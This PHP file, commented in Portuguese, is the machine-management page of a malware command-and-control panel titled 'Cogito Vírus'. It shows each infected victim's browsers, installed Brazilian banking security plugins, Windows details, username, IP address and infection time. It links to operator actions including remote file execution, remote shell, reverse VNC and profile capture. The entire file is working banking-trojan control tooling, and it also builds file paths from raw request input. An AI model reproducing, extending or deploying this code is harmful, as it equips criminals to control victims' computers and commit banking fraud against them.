<?php
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// 
// 8884588745827235.php / Gerenciamento.php ~~
//    Arquivo responsável gerenciar máquinas.
//
//    * Exibe informações sobre a máquina.
//    * Exibe opções para gerenciamento da máquina.
//    
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

	error_reporting(0);
	session_start();
	
	include("../modules/extras/global.php");	// Dados globais.
	include("../config.php");					// Configurações.
	include("0923840923949455.php");			// Itens globais do site.
	
	// Verifica login...
	if (!isset($_SESSION["LNG"])) { die($errorPage); }

	
	if(isset($_GET["CTL"])) {
		// Abre INI e exibe informações.
		$FileY = "../modules/extras/FUIDX/". $_GET["CTL"] .".txt";
		$INIFLX = parse_ini_file($FileY, 'FLXINX');
		
		$FileX = "../maquinas/". $INIFLX['FLXINX']['FLX'];
		$INIFLX = parse_ini_file($FileX, 'UID');
		
		// Armazena informações..., UID...
		$UIDX = $INIFLX['UID']['UID'];
		
		// Plugins...
		$INIFLX = parse_ini_file($FileX, 'PLS');
		$PluginCF = $INIFLX['PLS']['CF'];
		$PluginBX = $INIFLX['PLS']['BX'];
		$PluginUN = $INIFLX['PLS']['UN'];
		$PluginAB = $INIFLX['PLS']['AB'];
		$PluginSC = $INIFLX['PLS']['SC'];
		
		// Navegadores...
		$INIFLX = parse_ini_file($FileX, 'NVS');
		$NavFF = $INIFLX['NVS']['FF'];
		$NavCH = $INIFLX['NVS']['CH'];
		$NavIX = $INIFLX['NVS']['IX'];
		$NavNS = $INIFLX['NVS']['NS'];
		$NavPR = $INIFLX['NVS']['PR'];
		
		// Windows e user...
		$INIFLX = parse_ini_file($FileX, 'WNI');
		$WindowsVersion = $INIFLX['WNI']['VS'];
		$WindowsEdition = $INIFLX['WNI']['ET'];
		$UserDirectory = $INIFLX['WNI']['SX'];
		$UnidadeUser = $INIFLX['WNI']['SA'];
		$SessaoAtiva = $INIFLX['WNI']['AX'];
		$ComputerName = $INIFLX['WNI']['CJ'];
		$UserName = $INIFLX['WNI']['HT'];
		$SysLocation = $INIFLX['WNI']['DZ'];
		$TimeInfected = $INIFLX['WNI']['GK'];
	
		// Windows edition...
		if (strcmp($WindowsEdition, "WN78") == 0) {
			$WindowsEditionX = "Windows 8";
		}
		if (strcmp($WindowsEdition, "WN7") == 0) {
			$WindowsEditionX = "Windows 7";
		}
		
		if (strcmp($WindowsEdition, "WNS23") == 0) {
			$WindowsEditionX = "Windows Server 2003";
		}
		
		if (strcmp($WindowsEdition, "WNYP") == 0) {
			$WindowsEditionX = "Windows XP";
		}
		
		if (strcmp($WindowsEdition, "WNV") == 0) {
			$WindowsEditionX = "Windows Vista";
		}
		
		if (strcmp($WindowsEdition, "WN00") == 0) {
			$WindowsEditionX = "Windows 2000";
		}
		
		if (strcmp($WindowsEdition, "WNUK") == 0) {
			$WindowsEditionX = "Windows Unknown";
		}
		
		// Acessos...
		$INIFLX = parse_ini_file($FileX, 'Acesso');
		$UserUPIP = $INIFLX['Acesso']['IP'];
		$UserAgentKilla = $INIFLX['Acesso']['UserAgent'];
		
		// Configurações das páginas...
		$PagDownloadFile 	= "4985793847582834.php?UID=". $_GET["CTL"] ."";
		$PagUploadFile 		= "4985793847582834.php?UID=". $_GET["CTL"] ."";
		$PagExecuteFile		= "4985793847582834.php?UID=". $_GET["CTL"] ."";
		$PagRemoteShell		= "9984583882626455.php?UID=". $_GET["CTL"] ."";
		$PagProfileCapture  = "3984899082834554.php?UID=". $_GET["CTL"] ."";
		$PagReverseVNC		= "9348587272485853.php?UID=". $_GET["CTL"] ."";
	}
?>
<html><head>
<meta content="text/html; charset=UTF-8" http-equiv="Content-Type" />
<title> Cogito V&iacute;rus :: Gerenciamento</title>
<link rel="shortcut icon" href="<?php echo $faviconGL; ?>" type="image/x-icon" />
<link href="../midia/SiteFL/style.css" rel="stylesheet" type="text/css" />

<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.5.2/jquery.min.js"></script>
<script type="text/javascript">

</script></head><body>	
<form name="form" method="post">
<center><pre><font style="color: white;"><?php echo $TopoMenu; ?><!-- Exibe topo e menu -->
|                                                                                                                                 |
|  <font style="color: #006400;">+---------------------------------------------------------------------------------------------------------------------------+</font>  |
|  <font style="color: #006400;">|</font>     <font style="color: #d6ef39;">,-------------------------------------------,</font>                                                                         <font style="color: #006400;">|</font>  |
|<font style="color: #d6ef39;">=======/</font>  <font style="color: #F28500;"><b>UID</b></font><font style="color: #00CCFF;">:</font> 0xf2ad8391c8c6903848c967366338b9df  <font style="color: #d6ef39;">/</font>                                                                          <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>   <font style="color: #d6ef39;">´-------------------------------------------´</font>                                                                           <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                                                                                                                           <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>   <font style="color: #d6ef39;">--[</font> NAVEGADORES <font style="color: #d6ef39;">]--             --[</font> PLUGINS <font style="color: #d6ef39;">]--                                 --[</font> INFORMAÇÕES DO WINDOWS <font style="color: #d6ef39;">]--</font>          <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>       <font style="color: #00FF00;">Mozilla Firefox</font><font style="color: #00CCFF;">...:</font> <?php

if ($NavFF == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}
?>          <font style="color: #00FF00;">BB</font><font style="color: #00CCFF;">....:</font> <?php
if ($PluginBX == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>           <font style="color: #006400;">.do-"""""'-o..</font>              <font style="color: #00FF00;">Vers&atilde;o</font><font style="color: #00CCFF;">:</font> <?php


$len = strlen($WindowsVersion);
if ($len == 25) { $buf = "". $WindowsVersion .""; }
if ($len == 24) { $buf = "". $WindowsVersion ." "; }
if ($len == 23) { $buf = "". $WindowsVersion ."  "; }
if ($len == 22) { $buf = "". $WindowsVersion ."   "; }
if ($len == 21) { $buf = "". $WindowsVersion ."    "; }
if ($len == 20) { $buf = "". $WindowsVersion ."     "; }
if ($len == 19) { $buf = "". $WindowsVersion ."      "; }
if ($len == 18) { $buf = "". $WindowsVersion ."       "; }
if ($len == 17) { $buf = "". $WindowsVersion ."        "; }
if ($len == 16) { $buf = "". $WindowsVersion ."         "; }
if ($len == 15) { $buf = "". $WindowsVersion ."          "; }
if ($len == 14) { $buf = "". $WindowsVersion ."           "; }
if ($len == 13) { $buf = "". $WindowsVersion ."            "; }
if ($len == 12) { $buf = "". $WindowsVersion ."             "; }
if ($len == 11) { $buf = "". $WindowsVersion ."              "; }
if ($len == 10) { $buf = "". $WindowsVersion ."               "; }
if ($len == 9) { $buf = "". $WindowsVersion ."                "; }
if ($len == 8) { $buf = "". $WindowsVersion ."                 "; }
if ($len == 7) { $buf = "". $WindowsVersion ."                  "; }
if ($len == 6) { $buf = "". $WindowsVersion ."                   "; }
if ($len == 5) { $buf = "". $WindowsVersion ."                    "; }
if ($len == 4) { $buf = "". $WindowsVersion ."                     "; }
if ($len == 3) { $buf = "". $WindowsVersion ."                      "; }
if ($len == 2) { $buf = "". $WindowsVersion ."                       "; }
if ($len == 1) { $buf = "". $WindowsVersion ."                        "; }

echo $buf;
?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>       <font style="color: #00FF00;">Google Chrome</font><font style="color: #00CCFF;">.....:</font> <?php
if ($NavCH == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>          <font style="color: #00FF00;">ABN</font><font style="color: #00CCFF;">...:</font> <?php
if ($PluginAB == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>        <font style="color: #006400;">.o""            ""..</font>           <font style="color: #00FF00;">Edi&ccedil;&atilde;o</font><font style="color: #00CCFF;">:</font> <?php

$len = strlen($WindowsEditionX);

if ($len == 22) { $buf = "". $WindowsEditionX .""; }
if ($len == 21) { $buf = "". $WindowsEditionX ." "; }
if ($len == 20) { $buf = "". $WindowsEditionX ."  "; }
if ($len == 19) { $buf = "". $WindowsEditionX ."   "; }
if ($len == 18) { $buf = "". $WindowsEditionX ."    "; }
if ($len == 17) { $buf = "". $WindowsEditionX ."     "; }
if ($len == 16) { $buf = "". $WindowsEditionX ."      "; }
if ($len == 15) { $buf = "". $WindowsEditionX ."       "; }
if ($len == 14) { $buf = "". $WindowsEditionX ."        "; }
if ($len == 13) { $buf = "". $WindowsEditionX ."         "; }
if ($len == 12) { $buf = "". $WindowsEditionX ."          "; }
if ($len == 11) { $buf = "". $WindowsEditionX ."           "; }
if ($len == 10) { $buf = "". $WindowsEditionX ."            "; }
if ($len ==  9) { $buf = "". $WindowsEditionX ."             "; }

echo $buf;

?>   <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>       <font style="color: #00FF00;">Internet Explorer</font><font style="color: #00CCFF;">.:</font> <?php
if ($NavIX == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>          <font style="color: #00FF00;">UNI</font><font style="color: #00CCFF;">...:</font> <?php
if ($PluginUN == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>      <font style="color: #006400;">,,''                 ``b.</font>        <font style="color: #00FF00;">User Path</font><font style="color: #00CCFF;">:</font> <?php

$len = strlen($UserDirectory);

if ($len > 22) { $buf = "NULL                  "; }
if ($len == 22) { $buf = "". $UserDirectory .""; }
if ($len == 21) { $buf = "". $UserDirectory ." "; }
if ($len == 20) { $buf = "". $UserDirectory ."  "; }
if ($len == 19) { $buf = "". $UserDirectory ."   "; }
if ($len == 18) { $buf = "". $UserDirectory ."    "; }
if ($len == 17) { $buf = "". $UserDirectory ."     "; }
if ($len == 16) { $buf = "". $UserDirectory ."      "; }
if ($len == 15) { $buf = "". $UserDirectory ."       "; }
if ($len == 14) { $buf = "". $UserDirectory ."        "; }
if ($len == 13) { $buf = "". $UserDirectory ."         "; }
if ($len == 12) { $buf = "". $UserDirectory ."          "; }
if ($len == 11) { $buf = "". $UserDirectory ."           "; }
if ($len == 10) { $buf = "". $UserDirectory ."            "; }
if ($len ==  9) { $buf = "". $UserDirectory ."             "; }
if ($len ==  8) { $buf = "". $UserDirectory ."              "; }
if ($len ==  7) { $buf = "". $UserDirectory ."               "; }
if ($len ==  6) { $buf = "". $UserDirectory ."                "; }
if ($len ==  5) { $buf = "". $UserDirectory ."                 "; }
if ($len ==  4) { $buf = "". $UserDirectory ."                  "; }
if ($len ==  3) { $buf = "". $UserDirectory ."                   "; }
if ($len ==  2) { $buf = "". $UserDirectory ."                    "; }

echo $buf;

?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>       <font style="color: #00FF00;">Netscape Navigator</font><font style="color: #00CCFF;">:</font> <?php
if ($NavNS == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>          <font style="color: #00FF00;">CEF</font><font style="color: #00CCFF;">...:</font> <?php
if ($PluginCF == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>     <font style="color: #006400;">d'                      ``b</font>       <font style="color: #00FF00;">Windows driver</font><font style="color: #00CCFF;">:</font> <?php

$len = strlen($UnidadeUser);

if ($len == 17) { $buf = "". $UnidadeUser .""; }
if ($len == 16) { $buf = "". $UnidadeUser ." "; }
if ($len == 15) { $buf = "". $UnidadeUser ."  "; }
if ($len == 14) { $buf = "". $UnidadeUser ."   "; }
if ($len == 13) { $buf = "". $UnidadeUser ."    "; }
if ($len == 12) { $buf = "". $UnidadeUser ."     "; }
if ($len == 11) { $buf = "". $UnidadeUser ."      "; }
if ($len == 10) { $buf = "". $UnidadeUser ."       "; }
if ($len == 9) { $buf = "". $UnidadeUser ."        "; }
if ($len == 8) { $buf = "". $UnidadeUser ."         "; }
if ($len == 7) { $buf = "". $UnidadeUser ."          "; }
if ($len == 6) { $buf = "". $UnidadeUser ."           "; }
if ($len == 5) { $buf = "". $UnidadeUser ."            "; }
if ($len == 4) { $buf = "". $UnidadeUser ."             "; }
if ($len == 3) { $buf = "". $UnidadeUser ."              "; }
if ($len == 2) { $buf = "". $UnidadeUser ."               "; }
if ($len == 1) { $buf = "". $UnidadeUser ."                "; }

echo $buf;
?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>       <font style="color: #00FF00;">Opera Browser</font><font style="color: #00CCFF;">.....:</font> <?php
if ($NavPR == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>          <font style="color: #00FF00;">Scopus</font><font style="color: #00CCFF;">:</font> <?php
if ($PluginSC == 1) {
	echo "SIM";
} else {
	echo "N&Atilde;O";
}

?>    <font style="color: #006400;">d`d:                       `b.</font>     <font style="color: #00FF00;">Login atual</font><font style="color: #00CCFF;">:</font>  <?php

$len = strlen($SessaoAtiva);

if ($len == 19) { $buf = "". $SessaoAtiva .""; }
if ($len == 18) { $buf = "". $SessaoAtiva ." "; }
if ($len == 17) { $buf = "". $SessaoAtiva ."  "; }
if ($len == 16) { $buf = "". $SessaoAtiva ."   "; }
if ($len == 15) { $buf = "". $SessaoAtiva ."    "; }
if ($len == 14) { $buf = "". $SessaoAtiva ."     "; }
if ($len == 13) { $buf = "". $SessaoAtiva ."      "; }
if ($len == 12) { $buf = "". $SessaoAtiva ."       "; }
if ($len == 11) { $buf = "". $SessaoAtiva ."        "; }
if ($len == 10) { $buf = "". $SessaoAtiva ."         "; }
if ($len ==  9) { $buf = "". $SessaoAtiva ."          "; }
if ($len ==  8) { $buf = "". $SessaoAtiva ."           "; }
if ($len ==  7) { $buf = "". $SessaoAtiva ."            "; }
if ($len ==  6) { $buf = "". $SessaoAtiva ."             "; }
if ($len ==  5) { $buf = "". $SessaoAtiva ."              "; }
if ($len ==  4) { $buf = "". $SessaoAtiva ."               "; }
if ($len ==  3) { $buf = "". $SessaoAtiva ."                "; }
if ($len ==  2) { $buf = "". $SessaoAtiva ."                 "; }
if ($len ==  1) { $buf = "". $SessaoAtiva ."                  "; }

echo $buf;
?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                                                     <font style="color: #006400;"> ,,dP                         `Y.</font>    <font style="color: #00FF00;">PC Name</font><font style="color: #00CCFF;">:</font> <?php

$len = strlen($ComputerName);

if ($len == 24) { $buf = "". $ComputerName .""; }
if ($len == 23) { $buf = "". $ComputerName ." "; }
if ($len == 22) { $buf = "". $ComputerName ."  "; }
if ($len == 21) { $buf = "". $ComputerName ."   "; }
if ($len == 20) { $buf = "". $ComputerName ."    "; }
if ($len == 19) { $buf = "". $ComputerName ."     "; }
if ($len == 18) { $buf = "". $ComputerName ."      "; }
if ($len == 17) { $buf = "". $ComputerName ."       "; }
if ($len == 16) { $buf = "". $ComputerName ."        "; }
if ($len == 15) { $buf = "". $ComputerName ."         "; }
if ($len == 14) { $buf = "". $ComputerName ."          "; }
if ($len == 13) { $buf = "". $ComputerName ."           "; }
if ($len == 12) { $buf = "". $ComputerName ."            "; }
if ($len == 11) { $buf = "". $ComputerName ."             "; }
if ($len == 10) { $buf = "". $ComputerName ."              "; }
if ($len ==  9) { $buf = "". $ComputerName ."               "; }
if ($len ==  8) { $buf = "". $ComputerName ."                "; }
if ($len ==  7) { $buf = "". $ComputerName ."                 "; }
if ($len ==  6) { $buf = "". $ComputerName ."                  "; }
if ($len ==  5) { $buf = "". $ComputerName ."                   "; }
if ($len ==  4) { $buf = "". $ComputerName ."                    "; }
if ($len ==  3) { $buf = "". $ComputerName ."                     "; }
if ($len ==  2) { $buf = "". $ComputerName ."                      "; }
if ($len ==  1) { $buf = "". $ComputerName ."                       "; }

echo $buf;
?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                                                     <font style="color: #006400;">d`88                           `8.</font>   <font style="color: #00FF00;">Usuário</font><font style="color: #00CCFF;">:</font> <?php

$len = strlen($UserName);

if ($len == 24) { $buf = "". $UserName .""; }
if ($len == 23) { $buf = "". $UserName ." "; }
if ($len == 22) { $buf = "". $UserName ."  "; }
if ($len == 21) { $buf = "". $UserName ."   "; }
if ($len == 20) { $buf = "". $UserName ."    "; }
if ($len == 19) { $buf = "". $UserName ."     "; }
if ($len == 18) { $buf = "". $UserName ."      "; }
if ($len == 17) { $buf = "". $UserName ."       "; }
if ($len == 16) { $buf = "". $UserName ."        "; }
if ($len == 15) { $buf = "". $UserName ."         "; }
if ($len == 14) { $buf = "". $UserName ."          "; }
if ($len == 13) { $buf = "". $UserName ."           "; }
if ($len == 12) { $buf = "". $UserName ."            "; }
if ($len == 11) { $buf = "". $UserName ."             "; }
if ($len == 10) { $buf = "". $UserName ."              "; }
if ($len ==  9) { $buf = "". $UserName ."               "; }
if ($len ==  8) { $buf = "". $UserName ."                "; }
if ($len ==  7) { $buf = "". $UserName ."                 "; }
if ($len ==  6) { $buf = "". $UserName ."                  "; }
if ($len ==  5) { $buf = "". $UserName ."                   "; }
if ($len ==  4) { $buf = "". $UserName ."                    "; }
if ($len ==  3) { $buf = "". $UserName ."                     "; }
if ($len ==  2) { $buf = "". $UserName ."                      "; }
if ($len ==  1) { $buf = "". $UserName ."                       "; }

echo $buf;
?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                               <font style="color: #00FF00;">ooooooooooooooooood88</font><font style="color: #006400;">8`88'                            `8</font>   <font style="color: #00FF00;">Sys Path</font><font style="color: #00CCFF;">:</font> <?php

$len = strlen($SysLocation);

if ($len == 23) { $buf = "". $SysLocation .""; }
if ($len == 22) { $buf = "". $SysLocation ." "; }
if ($len == 21) { $buf = "". $SysLocation ."  "; }
if ($len == 20) { $buf = "". $SysLocation ."   "; }
if ($len == 19) { $buf = "". $SysLocation ."    "; }
if ($len == 18) { $buf = "". $SysLocation ."     "; }
if ($len == 17) { $buf = "". $SysLocation ."      "; }
if ($len == 16) { $buf = "". $SysLocation ."       "; }
if ($len == 15) { $buf = "". $SysLocation ."        "; }
if ($len == 14) { $buf = "". $SysLocation ."         "; }
if ($len == 13) { $buf = "". $SysLocation ."          "; }
if ($len == 12) { $buf = "". $SysLocation ."           "; }
if ($len == 11) { $buf = "". $SysLocation ."            "; }
if ($len == 10) { $buf = "". $SysLocation ."             "; }
if ($len ==  9) { $buf = "". $SysLocation ."              "; }
if ($len ==  8) { $buf = "". $SysLocation ."               "; }
if ($len ==  7) { $buf = "". $SysLocation ."                "; }
if ($len ==  6) { $buf = "". $SysLocation ."                 "; }
if ($len ==  5) { $buf = "". $SysLocation ."                  "; }
if ($len ==  4) { $buf = "". $SysLocation ."                   "; }
if ($len ==  3) { $buf = "". $SysLocation ."                    "; }
if ($len ==  2) { $buf = "". $SysLocation ."                     "; }
if ($len ==  1) { $buf = "". $SysLocation ."                      "; }

echo $buf;
?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                             <font style="color: #00FF00;"> d"""    `""""""""""""</font><font style="color: #006400;">Y:d8P                              8,</font>  <font style="color: #00FF00;">DIF</font><font style="color: #00CCFF;">:</font> <?php 

$len = strlen($TimeInfected);

if ($len == 28) { $buf = "". $TimeInfected .""; }
if ($len == 27) { $buf = "". $TimeInfected ." "; }
if ($len == 26) { $buf = "". $TimeInfected ."  "; }
if ($len == 25) { $buf = "". $TimeInfected ."   "; }
if ($len == 24) { $buf = "". $TimeInfected ."    "; }
if ($len == 23) { $buf = "". $TimeInfected ."     "; }
if ($len == 22) { $buf = "". $TimeInfected ."      "; }
if ($len == 21) { $buf = "". $TimeInfected ."       "; }
if ($len == 20) { $buf = "". $TimeInfected ."        "; }
if ($len == 19) { $buf = "". $TimeInfected ."         "; }
if ($len == 18) { $buf = "". $TimeInfected ."          "; }
if ($len == 17) { $buf = "". $TimeInfected ."           "; }
if ($len == 16) { $buf = "". $TimeInfected ."            "; }
if ($len == 15) { $buf = "". $TimeInfected ."             "; }
if ($len == 14) { $buf = "". $TimeInfected ."              "; }
if ($len == 13) { $buf = "". $TimeInfected ."               "; }
if ($len == 12) { $buf = "". $TimeInfected ."                "; }
if ($len == 11) { $buf = "". $TimeInfected ."                 "; }
if ($len == 10) { $buf = "". $TimeInfected ."                  "; }
if ($len ==  9) { $buf = "". $TimeInfected ."                   "; }
if ($len ==  8) { $buf = "". $TimeInfected ."                    "; }
if ($len ==  7) { $buf = "". $TimeInfected ."                     "; }
if ($len ==  6) { $buf = "". $TimeInfected ."                      "; }
if ($len ==  5) { $buf = "". $TimeInfected ."                       "; }
if ($len ==  4) { $buf = "". $TimeInfected ."                        "; }
if ($len ==  3) { $buf = "". $TimeInfected ."                         "; }
if ($len ==  2) { $buf = "". $TimeInfected ."                          "; }
if ($len ==  1) { $buf = "". $TimeInfected ."                           "; }

echo $buf;

?><font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                             <font style="color: #00FF00;"> 8</font>                  <font style="color: #006400;">  P,88b                             ,`8 </font>                                  <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">.--------------------------------.</font>           <font style="color: #006400;"> ::d888,                           ,8:8. </font>                                 <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>       OPÇÕES DE CONTROLE       <font style="color: #d6ef39;">|</font>           <font style="color: #006400;"> dY88888                           `' ::</font>    <font style="color: #d6ef39;">--[</font> ACESSO <font style="color: #d6ef39;">]--</font>                <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>                                <font style="color: #d6ef39;">|</font>           <font style="color: #006400;"> 8:8888                               `b</font>       <font style="color: #00FF00;">IP</font><font style="color: #00CCFF;">:</font> <?php


$len = strlen($UserUPIP);

if ($len == 15) { $buf = "". $UserUPIP .""; }
if ($len == 14) { $buf = "". $UserUPIP ." "; }
if ($len == 13) { $buf = "". $UserUPIP ."  "; }
if ($len == 12) { $buf = "". $UserUPIP ."   "; }
if ($len == 11) { $buf = "". $UserUPIP ."    "; }
if ($len == 10) { $buf = "". $UserUPIP ."     "; }
if ($len ==  9) { $buf = "". $UserUPIP ."      "; }
if ($len ==  8) { $buf = "". $UserUPIP ."       "; }
if ($len ==  7) { $buf = "". $UserUPIP ."        "; }
if ($len ==  6) { $buf = "". $UserUPIP ."         "; }
if ($len ==  5) { $buf = "". $UserUPIP ."          "; }
if ($len ==  4) { $buf = "". $UserUPIP ."           "; }
if ($len ==  3) { $buf = "". $UserUPIP ."            "; }
if ($len ==  2) { $buf = "". $UserUPIP ."             "; }
if ($len ==  1) { $buf = "". $UserUPIP ."              "; }

echo $buf;

?>        <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>   <font style="color: #F28500;"><b>SET MODE</b></font>              <font style="color: #F28500;"><b>[</b></font> <font style="color: #d6ef39;">--</font> <font style="color: #F28500;"><b>]</b></font> <font style="color: #d6ef39;">|</font> <font style="color: #d6ef39;">---.</font>      <font style="color: #006400;"> Pd88P',...                     ,d888o.8</font>                                  <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>   <font style="color: #F28500;"><b>DOWNLOAD FILE</b></font>         <font style="color: #F28500;"><b>[</b></font> <a target="_blank" href="<?php echo $PagDownloadFile; ?>">GO</a> <font style="color: #F28500;"><b>]</b></font> <font style="color: #d6ef39;">|</font>    <font style="color: #d6ef39;">|</font>      <font style="color: #006400;"> :88'dd888888o.                d8888`88:</font>          <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>   <font style="color: #F28500;"><b>UPLOAD FILE</b></font>           <font style="color: #F28500;"><b>[</b></font> <a target="_blank" href="<?php echo $PagUploadFile; ?>">GO</a> <font style="color: #F28500;"><b>]</b></font> <font style="color: #d6ef39;">|</font>    <font style="color: #d6ef39;">|</font>      <font style="color: #006400;">,:Y:d8888888888b             ,d88888:88:</font>          <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>   <font style="color: #F28500;"><b>EXECUTE FILE</b></font>          <font style="color: #F28500;"><b>[</b></font> <a target="_blank" href="<?php echo $PagExecuteFile; ?>">GO</a> <font style="color: #F28500;"><b>]</b></font> <font style="color: #d6ef39;">|</font>    <font style="color: #d6ef39;">|</font>      <font style="color: #006400;">:::b88d888888888b.          ,d888888bY8b</font>          <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>   <font style="color: #F28500;"><b>REMOTE SHELL</b></font>          <font style="color: #F28500;"><b>[</b></font> <a target="_blank" href="<?php echo $PagRemoteShell; ?>">GO</a> <font style="color: #F28500;"><b>]</b></font> <font style="color: #d6ef39;">|</font>    <font style="color: #d6ef39;">|</font>      <font style="color: #006400;"> b:P8;888888888888.        ,88888888888P</font>          <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>   <font style="color: #F28500;"><b>REVERSE VNC</b></font>           <font style="color: #F28500;"><b>[</b></font> <a target="_blank" href="<?php echo $PagReverseVNC; ?>">GO</a> <font style="color: #F28500;"><b>]</b></font> <font style="color: #d6ef39;">|</font>    <font style="color: #d6ef39;">|</font>       <font style="color: #006400;">8:b88888888888888:        888888888888'</font>          <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">|</font>                                <font style="color: #d6ef39;">|</font>    <font style="color: #d6ef39;">|</font>      <font style="color: #006400;"> 8:8.8888888888888:        Y8888888888P</font>           <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>    <font style="color: #d6ef39;">'--------------------------------'</font>    <font style="color: #d6ef39;">|</font>      <font style="color: #006400;"> YP88d8888888888P'          ""888888"Y </font>           <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">:</font>           <font style="color: #d6ef39;">|</font>       <font style="color: #006400;">:bY8888P"""""''                     : </font>           <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">:</font>           <font style="color: #d6ef39;">|</font>       <font style="color: #006400;"> 8'8888'                            d  </font>          <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>        <font style="color: #d6ef39;">.--------------------------.      |</font>        <font style="color: #006400;">:bY888,                           ,P  </font>          <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>        <font style="color: #d6ef39;">|</font>         SET MODE         <font style="color: #d6ef39;">|      |</font>        <font style="color: #006400;"> Y,8888           d.  ,-         ,8'</font>            <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>        <font style="color: #d6ef39;">|</font>                          <font style="color: #d6ef39;">|      |</font>         <font style="color: #006400;">`8)888:           '            ,P' </font>            <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>        <font style="color: #d6ef39;">|</font> <font style="color: #00CCFF;">SPEED MODE    [</font> <a href="../modules/modeex/CTLMEX.php?MDX=1&UID=<?php echo $_GET["CTL"]; ?>">ATIVAR</a> <font style="color: #00CCFF;">] </font><font style="color: #d6ef39;">|------'</font>          <font style="color: #006400;">`88888.          ,...        ,P  </font>             <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>        <font style="color: #d6ef39;">|</font> <font style="color: #00CCFF;">SILENT MODE   [</font> <a href="../modules/modeex/CTLMEX.php?MDX=2&UID=<?php echo $_GET["CTL"]; ?>">ATIVAR</a> <font style="color: #00CCFF;">] </font><font style="color: #d6ef39;">|</font>                  <font style="color: #006400;">`Y8888,       ,888888o     ,P  </font>              <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>        <font style="color: #d6ef39;">|                          |</font>                   <font style="color: #006400;"> Y888b      ,88888888    ,P'</font>                <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>        <font style="color: #d6ef39;">'--------------------------'</font>                    <font style="color: #006400;"> `888b    ,888888888   ,,' </font>                <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">:</font>                           <font style="color: #006400;">`Y88b  dPY888888OP   :'  </font>                <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">:</font>                           <font style="color: #006400;">  :88.,'.   `' `8P-"b.   </font>                <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">:.</font>                           <font style="color: #006400;">  )8P,   ,b '  -   ``b  </font>                <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">::</font>                          <font style="color: #006400;">  :':   d,'d`b, .  - ,db </font>                <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
|  <font style="color: #006400;">|</font>                              <font style="color: #00FF00;">::</font>                        <font style="color: #006400;">    `b. dP' d8':      d88'</font>                 <font style="color: #00FF00;">8</font>                       <font style="color: #006400;">|</font>  |
